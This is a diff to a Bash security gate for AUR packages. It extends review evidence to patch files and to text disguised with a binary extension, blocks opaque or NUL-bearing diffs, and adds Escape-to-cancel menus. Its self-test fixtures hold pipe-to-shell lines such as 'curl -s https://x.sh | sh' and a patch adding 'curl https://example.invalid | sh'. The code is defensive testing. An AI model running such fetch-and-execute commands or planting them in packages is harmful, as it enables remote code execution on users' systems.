@@ -104,9 +104,13 @@ _configure_llm_auto_boring
 
 mkdir -p "$STATE_DIR" "$ACCEPTED_DIR" "$STAGED_DIR"
 
-# Pathspecs excluded from diff scanning. Binary blobs + patch/diff files: the
-# former aren't text, the latter legitimately contain escape sequences that would
-# false-positive on the hex/octal/eval rules.
+# Pathspecs excluded only from deterministic added-line scanning. Binary-like
+# suffixes are not useful regex input; patch/diff files have nested `+` syntax
+# that would false-positive. Review evidence uses NO suffix exclusions: an
+# attacker can put text in payload.png, and hiding it would make consent blind
+# (Finding T; design-ledger "Review evidence"). Git renders real binary content
+# as an identity-bearing marker; `_review_diff_to_file` rejects NUL-bearing
+# output and patch/diff files that attributes or content make opaque.
 EXCLUDE_PATHS=(
   ':!*.tar.*' ':!*.tar' ':!*.pkg.*' ':!*.sig' ':!*.asc'
   ':!*.zip' ':!*.gz' ':!*.zst' ':!*.bz2' ':!*.xz' ':!*.7z' ':!*.rar'
@@ -301,13 +305,39 @@ find_pkg_dir() {
 }
 
 # Emit only ADDED lines from a git diff (leading '+' stripped, '+++' headers
-# skipped). Binary blobs and patch files are excluded (see EXCLUDE_PATHS).
+# skipped). Binary blobs and nested patch files are excluded from deterministic
+# scanning (see EXCLUDE_PATHS); review stashes use the wider evidence set.
 # Assert git diff exit code: with pipefail, a pipeline masks git's failure
 # behind sed — capture first (finding C).
 diff_added() {
   local diff_out
   diff_out=$(git --no-pager diff "$@" -- "${EXCLUDE_PATHS[@]}" 2>/dev/null) || return 1
   sed -n '/^+++/!s/^+//p' <<<"$diff_out"
+}
+
+# Persist complete, reviewable evidence without ever routing raw git output
+# through a Bash scalar. No suffix pathspecs: extension is attacker-controlled.
+# `--no-textconv` prevents configured/attribute-selected converters. Reject an
+# empty diff, NUL-bearing text (Bash/LLM cannot carry it byte-faithfully), and
+# opaque patch/diff files (`--numstat` reports -/- for binary). Other binaries
+# retain git's marker + blob identities and are already structural review hits.
+_review_diff_to_file() {
+  local dir="$1" old="$2" new="$3" dest="$4" patch_stats
+  if ! git -C "$dir" --no-pager diff --no-textconv "$old" "$new" >"$dest" 2>/dev/null \
+     || [[ ! -s "$dest" ]]; then
+    return 1
+  fi
+  # A hostile .gitattributes can force NUL-bearing data through text diff.
+  # Refuse consent rather than let command substitution silently strip bytes.
+  if ! cmp -s "$dest" <(tr -d '\000' <"$dest"); then
+    return 1
+  fi
+  patch_stats=$(git -C "$dir" --no-pager diff --no-textconv --numstat \
+    "$old" "$new" -- '*.patch' '*.diff' 2>/dev/null) || return 1
+  if awk '$1 == "-" && $2 == "-" { opaque=1 } END { exit !opaque }' <<<"$patch_stats"; then
+    return 1
+  fi
+  return 0
 }
 
 _srcinfo_leading_ws_only_added_line() {
@@ -910,8 +940,7 @@ stash_flag() {
   local flagfile="$STATE_DIR/flag.${pkg}.diff" tmp
   tmp=$(mktemp "${flagfile}.tmp.XXXXXX") || return 1
   _register_temp_path "$tmp"
-  if ! git -C "$dir" --no-pager diff "${base}..origin/${AUR_REMOTE_BRANCH}" -- \
-      "${EXCLUDE_PATHS[@]}" >"$tmp" 2>/dev/null \
+  if ! _review_diff_to_file "$dir" "$base" "origin/${AUR_REMOTE_BRANCH}" "$tmp" \
       || ! mv -f "$tmp" "$flagfile" \
       || ! _atomic_write_record "$STATE_DIR/flag.${pkg}.context" "$context" \
       || ! ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" \
@@ -1189,13 +1218,17 @@ _clone_aur() {
 
 # Absolute (whole-file) scan of a cloned dir against both rule sets.
 # Sets globals: SCAN_HITS (hard rules), SCAN_REVIEW_HITS (review rules), and
-# SCAN_CONTENT (concatenated PKGBUILD+*.install+*.sh, caller may stash for
-# `explain`). Returns 1 if no content could be read, else 0. `audit` remains
-# advisory regardless of either result; the missing-cache tier-2 caller uses
-# both as review-level signals. Skipping REVIEW_PATTERNS there made a
-# force-pushed/baseline-less `pip install` candidate silently clean (Finding G).
+# SCAN_CONTENT (the whole tracked candidate rendered as an empty-tree diff for
+# `view`/`explain`). Deterministic regexes still scan only executable package
+# surfaces (PKGBUILD+*.install+*.sh): nested patch syntax would false-positive.
+# The evidence is wider by design and includes textual patches/diffs (Finding T).
+# Returns 1 if package surfaces or whole-candidate evidence cannot be read, else
+# 0. `audit` remains advisory regardless of either result; the missing-cache
+# tier-2 caller uses both rule sets as review-level signals. Skipping
+# REVIEW_PATTERNS there made a force-pushed/baseline-less `pip install`
+# candidate silently clean (Finding G).
 _scan_whole_pkg() {
-  local dir="$1" content
+  local dir="$1" content candidate empty_tree review_content
   local -a files
   SCAN_HITS=0; SCAN_REVIEW_HITS=0; SCAN_CONTENT=""
   shopt -s nullglob
@@ -1203,7 +1236,18 @@ _scan_whole_pkg() {
   shopt -u nullglob
   content=$(cat -- "${files[@]}" 2>/dev/null) || return 1
   [[ -z "$content" ]] && return 1
-  SCAN_CONTENT="$content"
+  candidate="${SCAN_SHA:-HEAD}"
+  empty_tree=$(git -C "$dir" mktree </dev/null 2>/dev/null) || return 1
+  local evidence_file
+  evidence_file=$(mktemp -t aur-safe-evidence.XXXXXX) || return 1
+  _register_temp_path "$evidence_file"
+  if ! _review_diff_to_file "$dir" "$empty_tree" "$candidate" "$evidence_file"; then
+    rm -f "$evidence_file"
+    return 1
+  fi
+  review_content=$(cat "$evidence_file") || { rm -f "$evidence_file"; return 1; }
+  rm -f "$evidence_file"
+  SCAN_CONTENT="$review_content"
   local i hits
   for i in "${!RULE_NAMES[@]}"; do
     local name="${RULE_NAMES[$i]}" pat="${RULE_PATTERNS[$i]}"
@@ -1665,12 +1709,21 @@ missing_cache_gate() {
       case $rc in
         1) rm -rf "${dir%/*}"
            return 1 ;;   # hard-fail: do NOT stage (blocked update → no build)
-        2) rm -rf "${dir%/*}"
-           if [[ -f "$STATE_DIR/flag.${pkg}.diff" ]] \
-              && ! _stage_scan_if_gating "$pkgbase"; then
+        2) # Retained history is attacker-controlled: a review-triggering delta
+           # cannot excuse payload already present in the reconstructed base.
+           # Replace the delta stash with whole-candidate evidence before consent.
+           if ! _scan_whole_pkg "$dir" \
+              || ! _stash_content "$pkg" baseline-recovery-whole-review "$SCAN_CONTENT"; then
+             rm -rf "${dir%/*}"
+             log "  $(c_red "BLOCK") $pkg — could not persist whole-candidate review"
+             return 1
+           fi
+           rm -rf "${dir%/*}"
+           if ! _stage_scan_if_gating "$pkgbase"; then
              log "  $(c_red "BLOCK") $pkg — could not persist staged audit state"
              return 1
            fi
+           log "  $(c_yellow "review") $pkg — reconstructed history baseline; whole candidate review required"
            return 2 ;;
         *) # Retained AUR history is attacker-controlled, so a reconstructed
            # baseline can improve delta precision but cannot earn silent trust.
@@ -1687,7 +1740,7 @@ missing_cache_gate() {
              log "  $(c_red "BLOCK") $pkg — could not persist staged audit state"
              return 1
            fi
-           log "  $(c_yellow "review") $pkg — reconstructed history baseline; whole PKGBUILD review required"
+           log "  $(c_yellow "review") $pkg — reconstructed history baseline; whole candidate review required"
            log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
            return 2 ;;
       esac
@@ -1711,7 +1764,7 @@ missing_cache_gate() {
   if (( SCAN_HITS || SCAN_REVIEW_HITS )); then
     log "  $(c_yellow "review") $pkg — rule hit(s) in uncached PKGBUILD; consent required"
   else
-    log "  $(c_yellow "review") $pkg — no history baseline; whole PKGBUILD review required"
+    log "  $(c_yellow "review") $pkg — no history baseline; whole candidate review required"
   fi
   log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
   if ! _stage_scan_if_gating "$pkgbase"; then
@@ -1849,8 +1902,25 @@ _resolve_review_pkg() {
   return 1
 }
 
+# Read a line-oriented menu choice while making Escape an immediate cancel.
+# The first character is read separately because plain `read -r` cannot observe
+# Escape until Enter. These menus contain only short package/action choices, so
+# sacrificing readline editing here buys the expected one-key abort semantics.
+_MENU_INPUT=""
+_read_menu_input() {
+  local first rest
+  _MENU_INPUT=""
+  IFS= read -r -n 1 first || return 1
+  case "$first" in
+    $'\e') return 2 ;;
+    ''|$'\n'|$'\r') return 0 ;;
+  esac
+  IFS= read -r rest || return 1
+  _MENU_INPUT="$first$rest"
+}
+
 _choose_review_pkg() {
-  local action="$1" allow_all="${2:-0}" target pkg
+  local action="$1" allow_all="${2:-0}" target pkg input_rc
   shift 2
   if (( $# == 0 )); then
     return 1
@@ -1861,16 +1931,19 @@ _choose_review_pkg() {
   fi
   _print_review_pkg_list "$@"
   if [[ "$allow_all" == 1 ]]; then
-    printf 'aur-safe: %s which package? [number/name/all, empty cancels] ' "$action" >&2
+    printf 'aur-safe: %s which package? [number/name, empty=all, Esc cancels] ' "$action" >&2
   else
-    printf 'aur-safe: %s which package? [number/name, empty cancels] ' "$action" >&2
+    printf 'aur-safe: %s which package? [number/name, Esc cancels] ' "$action" >&2
   fi
-  read -r target
-  [[ -z "$target" ]] && return 1
-  if [[ "$allow_all" == 1 && "$target" == all ]]; then
+  _read_menu_input; input_rc=$?
+  (( input_rc == 2 )) && return 1
+  (( input_rc == 0 )) || return 1
+  target="$_MENU_INPUT"
+  if [[ "$allow_all" == 1 && ( -z "$target" || "$target" == all ) ]]; then
     printf '%s\n' all
     return 0
   fi
+  [[ -z "$target" ]] && return 1
   pkg=$(_resolve_review_pkg "$target" "$@") || {
     log "aur-safe: unknown review target '$target'"
     return 1
@@ -1936,34 +2009,55 @@ review_prompt() {
   fi
   while :; do
     if (( ${#review_pkgs[@]} > 1 )); then
-      printf 'aur-safe: review needed — [l]ist / [v]iew diff / [e]xplain / [y]es continue / [N]o abort: ' >&2
+      printf 'aur-safe: review needed — [l]ist / [v]iew diff / [e]xplain / [y]es continue / [N]/Esc abort: ' >&2
     else
-      printf 'aur-safe: review needed — [v]iew diff / [e]xplain / [y]es continue / [N]o abort: ' >&2
+      printf 'aur-safe: review needed — [v]iew diff / [e]xplain / [y]es continue / [N]/Esc abort: ' >&2
     fi
-    read -r ans
+    _read_menu_input
+    local input_rc=$?
+    if (( input_rc == 2 )); then
+      log "aur-safe: aborted by user"
+      return 1
+    elif (( input_rc != 0 )); then
+      log "aur-safe: aborted by user"
+      return 1
+    fi
+    ans="$_MENU_INPUT"
     case "$ans" in
       y|Y) return 0 ;;
-      n|N|'')
-        log "aur-safe: aborted by user"
-        return 1
-        ;;
-      l|L)
-        _print_review_pkg_list "${review_pkgs[@]}"
-        ;;
-      v|V)
-        target=$(_choose_review_pkg view 1 "${review_pkgs[@]}") || continue
-        if [[ "$target" == all ]]; then
-          _view_review_diffs "${review_pkgs[@]}"
-        else
-          _view_review_diffs "$target"
+      *)
+        if [[ -z "$ans" || "$ans" == n || "$ans" == N ]]; then
+          log "aur-safe: aborted by user"
+          return 1
         fi
+        case "$ans" in
+          l|L)
+            _print_review_pkg_list "${review_pkgs[@]}"
+            ;;
+          v|V)
+            target=$(_choose_review_pkg view 1 "${review_pkgs[@]}") || continue
+            if [[ "$target" == all ]]; then
+              _view_review_diffs "${review_pkgs[@]}"
+            else
+              _view_review_diffs "$target"
+            fi
+            ;;
+          e|E)
+            target=$(_choose_review_pkg explain 1 "${review_pkgs[@]}") || continue
+            if [[ "$target" == all ]]; then
+              for pkg in "${review_pkgs[@]}"; do
+                "$0" explain "$pkg" \
+                  || log "aur-safe: explain failed for $pkg (no stashed diff or pi missing)"
+              done
+            else
+              "$0" explain "$target" \
+                || log "aur-safe: explain failed for $target (no stashed diff or pi missing)"
+            fi
+            ;;
+          *) log "aur-safe: enter l, v, e, y, or N/Esc" ;;
+        esac
         ;;
-      e|E)
-        pkg=$(_choose_review_pkg explain 0 "${review_pkgs[@]}") || continue
-        "$0" explain "$pkg" || log "aur-safe: explain failed (no stashed diff or pi missing)"
-        ;;
-      *) log "aur-safe: enter l, v, e, y, or N" ;;
-    esac
+          esac
   done
 }
 
@@ -2498,6 +2592,19 @@ if command -v aur-safe >/dev/null 2>&1; then
         ${_context_opt2:+"$_context_opt2"} "$@"
   }
 
+  _AUR_SAFE_MENU_INPUT=""
+  _aur_safe_read_menu_input() {
+    local _first _rest
+    _AUR_SAFE_MENU_INPUT=""
+    IFS= read -r -n 1 _first || return 1
+    case "$_first" in
+      $'\e') return 2 ;;
+      ''|$'\n'|$'\r') return 0 ;;
+    esac
+    IFS= read -r _rest || return 1
+    _AUR_SAFE_MENU_INPUT="$_first$_rest"
+  }
+
   _aur_safe_gate() {
     aur-safe gate
     local _rc=$?
@@ -2509,8 +2616,12 @@ if command -v aur-safe >/dev/null 2>&1; then
            local _ans _sd _pkg _diff
            _sd="${AUR_SAFE_STATE_DIR:-$HOME/.cache/aur-safe}"
            while :; do
-             printf 'aur-safe: review needed — [v]iew diff / [e]xplain / [y]es continue / [N]o abort: ' >&2
-             read -r _ans
+             printf 'aur-safe: review needed — [v]iew diff / [e]xplain / [y]es continue / [N]/Esc abort: ' >&2
+             _aur_safe_read_menu_input
+             local _input_rc=$?
+             [ "$_input_rc" -eq 2 ] && return 1
+             [ "$_input_rc" -eq 0 ] || return 1
+             _ans="$_AUR_SAFE_MENU_INPUT"
              case "$_ans" in
                y|Y) return 0 ;;
                n|N|'') return 1 ;;
@@ -2660,6 +2771,15 @@ cmd_selftest() {
   if [ "$_allow_zero_rc" = 2 ]; then
     log "  $(c_green "PASS") allow-review-zero-disabled"; pass=$((pass+1))
   else log "  $(c_red "FAIL") allow-review-zero-disabled (got rc $_allow_zero_rc)"; fail=$((fail+1)); fi
+  local _explain_target _esc_rc=0
+  _explain_target=$(_choose_review_pkg explain 1 one-pkg two-pkg <<<'' 2>/dev/null)
+  _choose_review_pkg explain 1 one-pkg two-pkg <<<$'\e' >/dev/null 2>&1 || _esc_rc=$?
+  if [ "$_explain_target" = all ] && [ "$_esc_rc" -eq 1 ]; then
+    log "  $(c_green "PASS") explain-empty-all-esc-cancel-selection"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") explain-empty-all-esc-cancel-selection (target=$_explain_target esc=$_esc_rc)"
+    fail=$((fail+1))
+  fi
   CONFIG_FILE="$_old_cfg"; LLM_AUTO_BORING="$_old_llm_auto"
   if (( _had_llm_env )); then
     AUR_SAFE_LLM_AUTO_BORING="$_old_llm_env"
@@ -3043,15 +3163,17 @@ cmd_selftest() {
   # Also a review-only fixture (pip) to prove tier 2 surfaces review rules
   # for consent, and an evil-install fixture (payload in .install, not PKGBUILD) to
   # prove the sourced-script surface is scanned.
-  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/src/review-pkg" "$_fbx/src/review-pip3" "$_fbx/src/evil-install" "$_fbx/src/empty-pkg" "$_fbx/aur"
+  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/src/review-pkg" "$_fbx/src/review-pip3" "$_fbx/src/evil-install" "$_fbx/src/patch-pkg" "$_fbx/src/empty-pkg" "$_fbx/aur"
   printf 'pkgname=clean-pkg\npkgver=1\npkgrel=1\nsource=("https://example.com/x.tar")\n' >"$_fbx/src/clean-pkg/PKGBUILD"
   printf 'pkgname=evil-pkg\npkgver=1\npkgrel=1\nbuild() { npm install payload; }\n' >"$_fbx/src/evil-pkg/PKGBUILD"
   printf 'pkgname=review-pkg\npkgver=1\npkgrel=1\nbuild() { pip install requests; }\n' >"$_fbx/src/review-pkg/PKGBUILD"
   printf 'pkgname=review-pip3\npkgver=1\npkgrel=1\nbuild() { python3 -m pip install requests; }\n' >"$_fbx/src/review-pip3/PKGBUILD"
   printf 'pkgname=evil-install\npkgver=1\npkgrel=1\ninstall=evil.install\n' >"$_fbx/src/evil-install/PKGBUILD"
   printf 'post_install() { curl -s https://x.sh | sh; }\n' >"$_fbx/src/evil-install/evil.install"
+  printf 'pkgname=patch-pkg\npkgver=1\npkgrel=1\nsource=(payload.patch)\nsha256sums=(SKIP)\n' >"$_fbx/src/patch-pkg/PKGBUILD"
+  printf '%s\n' '--- a/x' '+++ b/x' '@@ -0,0 +1 @@' '+curl https://example.invalid | sh' >"$_fbx/src/patch-pkg/payload.patch"
   : >"$_fbx/src/empty-pkg/PKGBUILD"
-  for _p in clean-pkg evil-pkg review-pkg review-pip3 evil-install empty-pkg; do
+  for _p in clean-pkg evil-pkg review-pkg review-pip3 evil-install patch-pkg empty-pkg; do
     git -C "$_fbx/src/$_p" -c init.defaultBranch=master init -q
     git -C "$_fbx/src/$_p" add -A; git -C "$_fbx/src/$_p" -c user.email=t@t -c user.name=t commit -qm base
     git clone -q --bare "$_fbx/src/$_p" "$_fbx/aur/$_p.git"
@@ -3081,6 +3203,13 @@ cmd_selftest() {
   ta "uncached-review-only-returns-review" 2 check_pkg review-pkg
   ta "uncached-python-pip-returns-review"  2 check_pkg review-pip3
   ta "uncached-install-hit-returns-2"      2 check_pkg evil-install
+  ta "uncached-patch-requires-review"      2 check_pkg patch-pkg
+  if grep -q '^diff --git a/payload\.patch b/payload\.patch$' "$STATE_DIR/flag.patch-pkg.diff" \
+     && grep -Fq '+curl https://example.invalid | sh' "$STATE_DIR/flag.patch-pkg.diff"; then
+    log "  $(c_green "PASS") uncached-whole-candidate-includes-patch"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") uncached-whole-candidate-includes-patch"; fail=$((fail+1))
+  fi
   ta "uncached-empty-pkgbuild-block"   1 check_pkg empty-pkg
   # clone failure (no such fixture) → block (zero signal is not consentable)
   ta "uncached-clonefail-blocks"       1 check_pkg nonexistent-pkg
@@ -3169,7 +3298,7 @@ cmd_selftest() {
 
   # REVIEW HIT: delta adds a pip install (review-only rule) → review (2).
   _bl_bld "$_fbx" rv-pkg \
-    '1.0@' \
+    '1.0@payload.patch=payload retained in reconstructed baseline' \
     '2.0@build.sh=pip install requests'
   _AUR_TEST_Q="rv-pkg 1.0-1"
   ta "baseline-review-hit-returns-2" 2 check_pkg rv-pkg
@@ -3178,6 +3307,14 @@ cmd_selftest() {
   if [ -f "$STATE_DIR/flag.rv-pkg.diff" ]; then
     log "  $(c_green "PASS") baseline-review-stashes-diff"; pass=$((pass+1))
   else log "  $(c_red "FAIL") baseline-review-stashes-diff"; fail=$((fail+1)); fi
+  # A review hit in the delta must not hide content retained in the attacker-
+  # controlled reconstructed baseline. Consent always sees the whole candidate.
+  if grep -q '^diff --git a/payload\.patch b/payload\.patch$' "$STATE_DIR/flag.rv-pkg.diff" \
+     && grep -Fq 'payload retained in reconstructed baseline' "$STATE_DIR/flag.rv-pkg.diff"; then
+    log "  $(c_green "PASS") baseline-review-stashes-whole-candidate"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") baseline-review-stashes-whole-candidate"; fail=$((fail+1))
+  fi
 
   # FALLBACK: installed version not in AUR history → whole-file hard scan →
   # review (2). Uses fp-pkg (has pre-existing hook) queried at a bogus version.
@@ -4090,6 +4227,75 @@ cmd_selftest() {
     "$_old_basic" \
     "$_old_basic"$'\nbuild() { npm install payload; }' \
     "$_old_src" "$_old_src"
+
+  # Finding T: nested patch syntax is excluded from deterministic added-line
+  # rules (the payload-looking line below must not false-positive as hard), but
+  # the review stash must retain the patch content. Before the fix, the gate
+  # correctly requested review while both `view` and `explain` silently omitted
+  # the changed file—the exact ventoy-bin failure that exposed this gap.
+  local _patch_rc
+  _class_bld "$_clx" cls-patch-evidence "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
+  printf '%s\n' '--- a/x' '+++ b/x' '@@ -0,0 +1 @@' '+curl https://example.invalid | sh' \
+    >"$_CLASS_DIR/payload.patch"
+  git -C "$_CLASS_DIR" add payload.patch
+  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm patch-evidence
+  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
+  LLM_AUTO_BORING=0
+  scan_diff_rules cls-patch-evidence "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
+  _patch_rc=$?
+  if [ "$_patch_rc" -eq 2 ] \
+     && grep -q '^diff --git a/payload\.patch b/payload\.patch$' "$STATE_DIR/flag.cls-patch-evidence.diff" \
+     && grep -Fq '+curl https://example.invalid | sh' "$STATE_DIR/flag.cls-patch-evidence.diff"; then
+    log "  $(c_green "PASS") review-stash-includes-patch-evidence"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") review-stash-includes-patch-evidence (rc $_patch_rc)"; fail=$((fail+1))
+  fi
+
+  # Evidence policy cannot trust suffixes: text disguised as an excluded scan
+  # type must still be visible to review.
+  _class_bld "$_clx" cls-disguised-text "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
+  printf 'review-visible disguised text\n' >"$_CLASS_DIR/payload.png"
+  git -C "$_CLASS_DIR" add payload.png
+  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm disguised-text
+  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
+  scan_diff_rules cls-disguised-text "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
+  _patch_rc=$?
+  if [ "$_patch_rc" -eq 2 ] \
+     && grep -Fq 'review-visible disguised text' "$STATE_DIR/flag.cls-disguised-text.diff"; then
+    log "  $(c_green "PASS") review-stash-includes-extension-disguised-text"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") review-stash-includes-extension-disguised-text (rc $_patch_rc)"; fail=$((fail+1))
+  fi
+
+  # Attacker-controlled attributes or NUL content must not make a textual patch
+  # opaque/corrupt while leaving a consentable review. Both fail closed.
+  _class_bld "$_clx" cls-opaque-patch "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
+  printf '*.patch binary\n' >"$_CLASS_DIR/.gitattributes"
+  printf 'hidden patch text\n' >"$_CLASS_DIR/payload.patch"
+  git -C "$_CLASS_DIR" add .gitattributes payload.patch
+  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm opaque-patch
+  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
+  scan_diff_rules cls-opaque-patch "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
+  _patch_rc=$?
+  if [ "$_patch_rc" -eq 1 ]; then
+    log "  $(c_green "PASS") review-opaque-patch-blocks"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") review-opaque-patch-blocks (rc $_patch_rc)"; fail=$((fail+1))
+  fi
+
+  _class_bld "$_clx" cls-nul-patch "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
+  printf '*.patch text\n' >"$_CLASS_DIR/.gitattributes"
+  printf 'visible\000hidden\n' >"$_CLASS_DIR/payload.patch"
+  git -C "$_CLASS_DIR" add .gitattributes payload.patch
+  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm nul-patch
+  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
+  scan_diff_rules cls-nul-patch "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
+  _patch_rc=$?
+  if [ "$_patch_rc" -eq 1 ]; then
+    log "  $(c_green "PASS") review-nul-evidence-blocks"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") review-nul-evidence-blocks (rc $_patch_rc)"; fail=$((fail+1))
+  fi
 
   # NUL-delimited structural parsing: an attacker-controlled tab in a filename
   # must still register as an added file, never split or disappear.
